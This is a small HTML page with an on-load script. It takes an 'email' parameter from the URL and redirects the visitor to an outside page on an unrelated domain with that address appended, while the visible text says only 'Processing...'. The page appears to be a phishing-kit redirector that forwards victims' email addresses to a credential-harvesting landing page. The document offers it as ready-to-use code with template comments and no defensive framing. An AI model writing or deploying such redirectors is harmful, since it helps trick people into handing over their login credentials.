<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirect Page</title>
<script>
    // Function to extract email from URL parameters
    function getEmailFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('email');
    }

    // Function to redirect to the final destination with email parameter
    function redirectToFinalDestination() {
        const email = getEmailFromURL();
        if (email) {
            // Replace 'YOUR_FINAL_DESTINATION_URL' with your actual final destination URL
            const finalDestinationURL = 'https://smartopiainc.com/muju/index.html'; // Your final destination URL
            // Append email parameter to the final destination URL
            const redirectURL = finalDestinationURL + email;
            window.location.href = redirectURL;
        } else {
            // Handle case where email parameter is missing
            alert('Error loading');
        }
    }

    // Call the redirect function when the page loads
    window.onload = redirectToFinalDestination;
</script>
</head>
<body>
    <!-- Optional: You can add a loading message or spinner here -->
    <p>Processing...</p>
</body>
</html>
